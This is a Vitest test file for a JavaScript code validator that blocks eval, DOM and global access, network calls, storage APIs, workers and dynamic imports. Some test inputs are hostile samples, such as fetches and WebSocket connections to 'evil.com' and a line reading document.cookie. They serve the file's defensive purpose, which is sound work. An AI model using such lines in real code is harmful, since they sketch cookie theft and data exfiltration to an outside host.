import { describe, it, expect } from 'vitest'
import { validateCode, FORBIDDEN_PATTERNS } from './code-validator'

describe('validateCode', () => {
  describe('valid code', () => {
    it('should accept simple function definitions', () => {
      const code = 'function add(a, b) { return a + b; }'
      const result = validateCode(code)

      expect(result.valid).toBe(true)
      expect(result.violations).toHaveLength(0)
    })

    it('should accept console.log statements', () => {
      const code = 'console.log("Hello");'
      const result = validateCode(code)

      expect(result.valid).toBe(true)
    })

    it('should accept array methods', () => {
      const code = '[1,2,3].map(x => x * 2)'
      const result = validateCode(code)

      expect(result.valid).toBe(true)
    })
  })

  describe('forbidden patterns - eval and Function', () => {
    it('should reject eval()', () => {
      const code = 'eval("alert(1)")'
      const result = validateCode(code)

      expect(result.valid).toBe(false)
      expect(result.violations.some(v => v.pattern === 'eval')).toBe(true)
    })

    it('should reject new Function()', () => {
      const code = 'new Function("return 1")'
      const result = validateCode(code)

      expect(result.valid).toBe(false)
      expect(result.violations.some(v => v.pattern === 'Function')).toBe(true)
    })
  })

  describe('forbidden patterns - DOM access', () => {
    it('should reject document access', () => {
      const code = 'document.getElementById("test")'
      const result = validateCode(code)

      expect(result.valid).toBe(false)
      expect(result.violations.some(v => v.pattern === 'document')).toBe(true)
    })

    it('should reject window access', () => {
      const code = 'window.location.href'
      const result = validateCode(code)

      expect(result.valid).toBe(false)
      expect(result.violations.some(v => v.pattern === 'window')).toBe(true)
    })
  })

  describe('forbidden patterns - global objects', () => {
    it('should reject globalThis', () => {
      const code = 'globalThis.foo = 1'
      const result = validateCode(code)

      expect(result.valid).toBe(false)
      expect(result.violations.some(v => v.pattern === 'globalThis')).toBe(true)
    })

    it('should reject process access', () => {
      const code = 'process.env.SECRET'
      const result = validateCode(code)

      expect(result.valid).toBe(false)
      expect(result.violations.some(v => v.pattern === 'process')).toBe(true)
    })

    it('should reject require', () => {
      const code = 'const fs = require("fs")'
      const result = validateCode(code)

      expect(result.valid).toBe(false)
      expect(result.violations.some(v => v.pattern === 'require')).toBe(true)
    })
  })

  describe('forbidden patterns - network', () => {
    it('should reject fetch', () => {
      const code = 'fetch("https://evil.com")'
      const result = validateCode(code)

      expect(result.valid).toBe(false)
      expect(result.violations.some(v => v.pattern === 'fetch')).toBe(true)
    })

    it('should reject XMLHttpRequest', () => {
      const code = 'new XMLHttpRequest()'
      const result = validateCode(code)

      expect(result.valid).toBe(false)
      expect(result.violations.some(v => v.pattern === 'XMLHttpRequest')).toBe(true)
    })

    it('should reject WebSocket', () => {
      const code = 'new WebSocket("ws://evil.com")'
      const result = validateCode(code)

      expect(result.valid).toBe(false)
      expect(result.violations.some(v => v.pattern === 'WebSocket')).toBe(true)
    })
  })

  describe('forbidden patterns - storage', () => {
    it('should reject localStorage', () => {
      const code = 'localStorage.setItem("key", "value")'
      const result = validateCode(code)

      expect(result.valid).toBe(false)
      expect(result.violations.some(v => v.pattern === 'localStorage')).toBe(true)
    })

    it('should reject sessionStorage', () => {
      const code = 'sessionStorage.getItem("key")'
      const result = validateCode(code)

      expect(result.valid).toBe(false)
      expect(result.violations.some(v => v.pattern === 'sessionStorage')).toBe(true)
    })

    it('should reject indexedDB', () => {
      const code = 'indexedDB.open("db")'
      const result = validateCode(code)

      expect(result.valid).toBe(false)
      expect(result.violations.some(v => v.pattern === 'indexedDB')).toBe(true)
    })
  })

  describe('forbidden patterns - dangerous APIs', () => {
    it('should reject import()', () => {
      const code = 'import("./module")'
      const result = validateCode(code)

      expect(result.valid).toBe(false)
      expect(result.violations.some(v => v.pattern === 'import')).toBe(true)
    })

    it('should reject Worker', () => {
      const code = 'new Worker("worker.js")'
      const result = validateCode(code)

      expect(result.valid).toBe(false)
      expect(result.violations.some(v => v.pattern === 'Worker')).toBe(true)
    })

    it('should reject SharedArrayBuffer', () => {
      const code = 'new SharedArrayBuffer(1024)'
      const result = validateCode(code)

      expect(result.valid).toBe(false)
      expect(result.violations.some(v => v.pattern === 'SharedArrayBuffer')).toBe(true)
    })
  })

  describe('multiple violations', () => {
    it('should detect multiple forbidden patterns', () => {
      const code = 'eval(document.cookie); fetch("http://evil.com")'
      const result = validateCode(code)

      expect(result.valid).toBe(false)
      expect(result.violations.length).toBeGreaterThan(1)
    })
  })

  describe('case sensitivity', () => {
    it('should detect patterns regardless of case variations in strings', () => {
      const code = 'const x = "EVAL"; eval(x)'
      const result = validateCode(code)

      expect(result.valid).toBe(false)
    })
  })

  describe('FORBIDDEN_PATTERNS export', () => {
    it('should export the list of forbidden patterns', () => {
      expect(FORBIDDEN_PATTERNS).toBeDefined()
      expect(Array.isArray(FORBIDDEN_PATTERNS)).toBe(true)
      expect(FORBIDDEN_PATTERNS.length).toBeGreaterThan(0)
    })
  })
})
